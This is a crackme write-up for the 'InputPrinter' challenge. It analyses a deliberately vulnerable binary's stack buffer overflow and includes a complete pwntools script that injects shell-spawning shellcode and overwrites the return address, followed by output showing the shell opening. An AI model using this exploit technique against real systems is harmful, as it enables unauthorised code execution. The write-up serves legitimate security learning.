# InputPrinter writeup

Crackme ID: `69fc5a3a3fba64e45dcea9ed`
Writeup author: `andreagennaioli` www.andreagennaioli.dev
Personal difficulty rate: 2.5/6

## Program behavior

```bash
$ ./vuln
0x7ffc02745500
hello
you wrote: hello
```

## Static analysis

Looking at the code on Ghidra, we see that the `main` function calls `vuln` and then returns. Let's take a look at `vuln`:

```c
void vuln(void) {
  char buf [64];
  
  printf("%p\n",buf);
  fflush(stdout);
  read(0,buf,0xff);
  printf("you wrote: %s",buf);
  return;
}
```

We can note an interesting thing: the read actually reads 255 bytes (`0xff`), not only 64 as expected. This, combined with the output of the buf pointer, gives us a good stack overflow. In practice, we can overwrite the stack frame (only for 255 bytes).

Now we need to understand how to use this vulnerability. The author gave us the hint to run a shell, but how? The key factor is overwriting the return address stored in the function stack frame. Let's see how a function stack frame is structured:

Higher address
|-------------------------|
|    Return address       | 8 bytes
|-------------------------|
|        saved RBP        | 8 bytes
|-------------------------|
|     possible padding    | ? bytes
|-------------------------|
|     local variables     | 64 bytes in our case
|        (buf[64])        |
|-------------------------|
Lower address

We got the ability to write 255 bytes starting from the end of the stack frame. We can see we can change the return address of our function! But currently we don't have an interesting return address to execute, unless we do: we can write the code we need into the process ourselves in the bytes of the stack frame and then set the return address as the start of `buf`. This is possible only if the stack is executable, this is defined in the ELF headers and usually it is set to be not executable. We can see that this time the stack is executable (RWE = Read, Write, Execute):

```bash
$ readelf -a vuln
...
GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RWE    0x10
...
```

The last thing we need to know is the actual padding which could be inserted by the compiler. For this we need to take a look at the first few lines of `vuln` function:

```asm
        00401146 55              PUSH       RBP
        00401147 48 89 e5        MOV        RBP,RSP    ; Update RBP register to the current stack offset
        0040114a 48 83 ec 40     SUB        RSP ,0x40
```

The return address is pushed to the stack in the `main` function before `CALL vuln`. Then `PUSH RBP` pushes the previous RBP to the stack (saved RBP) and then adds a 64 byte block to the stack. Looking at the setup for the call of `printf` we can see that `RBP - 0x40` is exactly the start of `buf`.

So the total bytes from the start of `buf` to the `return address` are 72.

We got all the infos we need. Let's write a Python script to spawn a shell:

```python
from pwn import *

exe = context.binary = ELF('./vuln')

io = exe.process()

# Reads the buf pointer
leak = int(io.recvline().strip(), 16)
log.success(f'buf @ {hex(leak)}')

# Builds the shellcode. Since the shellcode uses the stack to save strings like
# '/bin/sh' it's needed to move RSP away from our stack to avoid overwriting of
# the shellcode by the shellcode its self, since RSP points inside buf at the
# time of the shellcode execution.
shellcode = asm('sub rsp, 0x100') + asm(shellcraft.sh())
padding = 72 - len(shellcode)
log.info('shellcode: %d byte | padding: %d byte | total: %d byte' %
         (len(shellcode), padding, 72 + 8))

payload = shellcode + (b'A' * padding) + pack(leak)
io.sendline(payload)
io.interactive()
```

And then:

```bash
$ python3 script.py
[*] '/---/InputPrinter/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
[+] Starting local process '/---/InputPrinter/vuln': pid 44734
[+] buf @ 0x7fff8171ae30
[*] shellcode: 55 byte | padding: 17 byte | total: 80 byte
[*] Switching to interactive mode
$ ls
ghidra  script.py  vuln  writeup.md
```

Finally, I really enjoyed this crackme and I learned a lot about stack and buffer overflow.
